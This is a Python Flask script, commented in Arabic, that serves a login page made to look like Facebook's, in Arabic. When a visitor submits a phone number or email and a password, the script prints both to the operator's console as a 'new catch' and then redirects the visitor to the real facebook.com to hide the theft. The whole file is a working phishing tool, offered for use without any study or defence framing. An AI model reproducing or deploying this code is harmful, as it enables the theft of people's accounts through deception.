from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# واجهة فيسبوك المموهة (Anti-Detection)
html_ui = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 340px; text-align: center; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#1877f2;">facebook</h2>
        <form action="/auth" method="POST">
            <input type="text" name="v1" placeholder="رقم الهاتف أو البريد" required>
            <input type="password" name="v2" placeholder="كلمة السر" required>
            <button class="btn">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_ui)

@app.route('/auth', methods=['POST'])
def auth():
    user = request.form.get('v1')
    pwd = request.form.get('v2')
    
    # هذه الخطوة تطبع البيانات في Termux أو Logs الموقع
    print(f"\\n{'='*20}")
    print(f"🎯 صيد جديد يا فارس!")
    print(f"👤 الحساب: {user}")
    print(f"🔑 الباسورد: {pwd}")
    print(f"{'='*20}\\n")
    
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    # تشغيل السيرفر
    app.run(host='0.0.0.0', port=5000)
